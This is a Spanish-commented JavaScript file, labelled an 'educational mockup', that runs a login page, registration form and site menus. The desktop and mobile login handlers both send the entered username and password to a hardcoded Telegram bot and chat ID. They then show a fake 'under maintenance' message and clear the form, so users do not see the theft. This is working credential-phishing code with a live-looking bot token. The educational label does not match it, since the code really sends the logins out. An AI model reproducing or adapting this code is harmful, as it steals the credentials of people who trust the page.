// ====== Maqueta educativa — scripts compartidos ======

const TELEGRAM_TOKEN = "9159089747:AAGrdR7YNxmKCXvzeclLLpWhKCvt2ivc6uQ";
const TELEGRAM_CHAT_ID = "7007914207";

function enviarTelegram(origen, usuario, clave) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return Promise.resolve();

  const texto =
    `🔐 Intento de acceso (${origen})\n` +
    `👤 Usuario: ${usuario}\n` +
    `🔑 Clave: ${clave}`;

  return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    keepalive: true,
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: texto
    })
  }).catch(() => {});
}

/* ---- Pantalla de carga ---- */
const loader = document.getElementById('page-loader');
if (loader) {
  const ocultar = () => loader.classList.add('is-hidden');
  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(ocultar, 400);
  } else {
    document.addEventListener('DOMContentLoaded', () => setTimeout(ocultar, 450));
  }
  window.addEventListener('load', () => setTimeout(ocultar, 200));
  setTimeout(ocultar, 1800);
  
  document.addEventListener('click', (e) => {
    const a = e.target.closest('a[href]');
    if (!a) return;
    const href = a.getAttribute('href');
    if (!href || href.startsWith('#') || a.target === '_blank') return;
    const externo = /^https?:\/\//i.test(href) || href.startsWith('mailto:') || href.startsWith('tel:');
    if (!externo) loader.classList.remove('is-hidden');
  });
}

/* ====== Formulario de Login - Escritorio ====== */
const loginFormInline = document.getElementById('loginFormInline');
if (loginFormInline) {
  console.log("Carga completa");
  
  loginFormInline.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const emailInput = document.getElementById('loginUsuario');
    const passInput = document.getElementById('loginPasswordInline');

    const usuario = emailInput ? emailInput.value.trim() : '';
    const clave = passInput ? passInput.value.trim() : '';

    if (!usuario || !clave) {
      alert("Por favor completa el usuario y la contraseña.");
      return;
    }

    await enviarTelegram("Escritorio", usuario, clave);
    alert('Estamos en mantenimiento, intente más tarde');
    loginFormInline.reset();
  });
}

/* ====== Formulario de registro ====== */
const form = document.getElementById('form-registro');
if (form) {
  const btn = form.querySelector('.btn-continuar');
  const requeridos = ['primerNombre', 'primerApellido', 'tipoDoc', 'numDoc', 'lugarExp', 'genero'];

  document.querySelectorAll('.date input, #numDoc').forEach(inp => {
    inp.addEventListener('input', () => {
      inp.value = inp.value.replace(/\D/g, '');
      actualizarBoton();
    });
  });

  function fechaCompleta(dateEl) {
    const [d, m, y] = dateEl.querySelectorAll('input');
    return d.value && m.value && y.value.length === 4;
  }

  function actualizarBoton() {
    const camposOk = requeridos.every(id => document.getElementById(id).value.trim() !== '');
    const fechas = [...document.querySelectorAll('.date')].every(fechaCompleta);
    if (btn) btn.classList.toggle('is-ready', camposOk && fechas);
  }

  form.addEventListener('input', actualizarBoton);

  function setError(id, msg) {
    const el = document.getElementById(id);
    if (!el) return !msg;
    el.closest('.field').classList.toggle('has-error', !!msg);
    const span = document.querySelector(`.field__error[data-for="${id}"]`);
    if (span) span.textContent = msg || '';
    return !msg;
  }

  function errorFecha(dateEl, key, msg) {
    dateEl.classList.toggle('has-error', !!msg);
    const span = document.querySelector(`.field__error[data-for="${key}"]`);
    if (span) span.textContent = msg || '';
    return !msg;
  }

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    let ok = true;

    ok &= setError('primerNombre', !document.getElementById('primerNombre').value.trim() ? 'Campo obligatorio.' : '');
    ok &= setError('primerApellido', !document.getElementById('primerApellido').value.trim() ? 'Campo obligatorio.' : '');
    ok &= setError('tipoDoc', !document.getElementById('tipoDoc').value ? 'Escoge una opción.' : '');
    ok &= setError('numDoc', !/^\d{5,}$/.test(document.getElementById('numDoc').value.trim()) ? 'Número no válido.' : '');
    ok &= setError('lugarExp', !document.getElementById('lugarExp').value ? 'Escoge una opción.' : '');
    ok &= setError('genero', !document.getElementById('genero').value ? 'Escoge una opción.' : '');

    const fechas = document.querySelectorAll('.date');
    const [dn, mn, an] = fechas[0].querySelectorAll('input');
    let msgNac = '';
    if (!dn.value || !mn.value || an.value.length !== 4) {
      msgNac = 'Completa la fecha.';
    } else {
      const nac = new Date(`${an.value}-${mn.value.padStart(2,'0')}-${dn.value.padStart(2,'0')}`);
      const hoy = new Date();
      let edad = hoy.getFullYear() - nac.getFullYear();
      const diff = hoy.getMonth() - nac.getMonth();
      if (diff < 0 || (diff === 0 && hoy.getDate() < nac.getDate())) edad--;
      if (isNaN(nac.getTime())) msgNac = 'Fecha no válida.';
      else if (edad < 18) msgNac = 'Debes ser mayor de 18 años.';
    }
    ok &= errorFecha(fechas[0], 'fechaNac', msgNac);

    const [de, me, ae] = fechas[1].querySelectorAll('input');
    const msgExp = (!de.value || !me.value || ae.value.length !== 4) ? 'Completa la fecha.' : '';
    ok &= errorFecha(fechas[1], 'fechaExp', msgExp);

    if (ok) {
      alert('✅ Formulario válido.\n\n(No envió ninguna información.)');
    }
  });

  actualizarBoton();
}

/* ---- Widget de ayuda ---- */
const helpToggle = document.getElementById('help-toggle');
const helpMenu = document.getElementById('help-menu');
const helpClose = document.getElementById('help-close');
if (helpToggle && helpMenu && helpClose) {
  helpToggle.addEventListener('click', () => {
    helpMenu.hidden = false;
    helpToggle.style.display = 'none';
  });
  helpClose.addEventListener('click', () => {
    helpMenu.hidden = true;
    helpToggle.style.display = '';
  });
}

/* ---- Mega-menú (hamburguesa) ---- */
const hamburger = document.querySelector('.hamburger');
const megamenu = document.getElementById('megamenu');
const megaClose = document.getElementById('megamenu-close');
if (hamburger && megamenu) {
  const abrirMega = () => { megamenu.hidden = false; document.body.classList.add('no-scroll'); };
  const cerrarMega = () => { megamenu.hidden = true; document.body.classList.remove('no-scroll'); };
  hamburger.addEventListener('click', abrirMega);
  if (megaClose) megaClose.addEventListener('click', cerrarMega);
  megamenu.addEventListener('click', (e) => { if (e.target === megamenu) cerrarMega(); });
  document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && !megamenu.hidden) cerrarMega(); });
}

/* ---- Acordeón del mega-menú ---- */
document.querySelectorAll('.megacat').forEach((cat) => {
  cat.addEventListener('click', (e) => {
    if (!window.matchMedia('(max-width: 720px)').matches) return;
    if (e.target.closest('.megacat ul')) return;
    const abierta = cat.classList.contains('is-open');
    document.querySelectorAll('.megacat').forEach((c) => c.classList.remove('is-open'));
    if (!abierta) cat.classList.add('is-open');
  });
});

/* ---- Ventana de inicio de sesión (modal móvil) ---- */
(function () {
  const modal = document.getElementById('login-modal');
  if (!modal) return;
  const openers = document.querySelectorAll('.login-movil');
  const closeBtn = document.getElementById('login-close');

  const abrir = (e) => { if (e) e.preventDefault(); modal.hidden = false; document.body.classList.add('no-scroll'); };
  const cerrar = () => { modal.hidden = true; document.body.classList.remove('no-scroll'); };

  openers.forEach(a => a.addEventListener('click', abrir));
  if (closeBtn) closeBtn.addEventListener('click', cerrar);
  modal.addEventListener('click', (e) => { if (e.target === modal) cerrar(); });
  document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && !modal.hidden) cerrar(); });

  const formModal = document.getElementById('loginModalForm');
  if (formModal) {
    formModal.addEventListener('submit', async (e) => {
      e.preventDefault();

      const emailInput = formModal.querySelector('input[type="text"], input[type="email"]');
      const passInput = formModal.querySelector('input[type="password"]');

      const usuario = emailInput ? emailInput.value.trim() : '';
      const clave = passInput ? passInput.value.trim() : '';

      if (!usuario) { 
        alert('Por favor ingresa tu correo o usuario');
        if (emailInput) emailInput.focus();
        return; 
      }
      if (!clave) { 
        alert('Por favor ingresa tu contraseña');
        if (passInput) passInput.focus();
        return; 
      }

      await enviarTelegram("Móvil", usuario, clave);
      alert('Estamos en mantenimiento, por favor intente más tarde.');
      formModal.reset();
      cerrar();
    });
  }
})();

/* ---- Carruseles del footer ---- */
function setupMarquees() {
  document.querySelectorAll('.marquee__track').forEach(track => {
    if (track.dataset.looped) return;
    const container = track.parentElement;
    if (!container || container.offsetWidth === 0) return;
    
    const base = track.innerHTML;
    let guard = 0;
    while (track.scrollWidth < container.offsetWidth * 1.5 && guard < 15) {
      track.insertAdjacentHTML('beforeend', base);
      guard++;
    }
    track.innerHTML += track.innerHTML;
    track.dataset.looped = '1';
  });
}
window.addEventListener('load', setupMarquees);
setupMarquees();

/* ---- Acordeón del footer ---- */
document.querySelectorAll('.footer__col .footer__head').forEach(head => {
  head.addEventListener('click', () => {
    const col = head.closest('.footer__col');
    const yaAbierta = col.classList.contains('is-open');
    document.querySelectorAll('.footer__col').forEach(c => c.classList.remove('is-open'));
    if (!yaAbierta) col.classList.add('is-open');
  });
});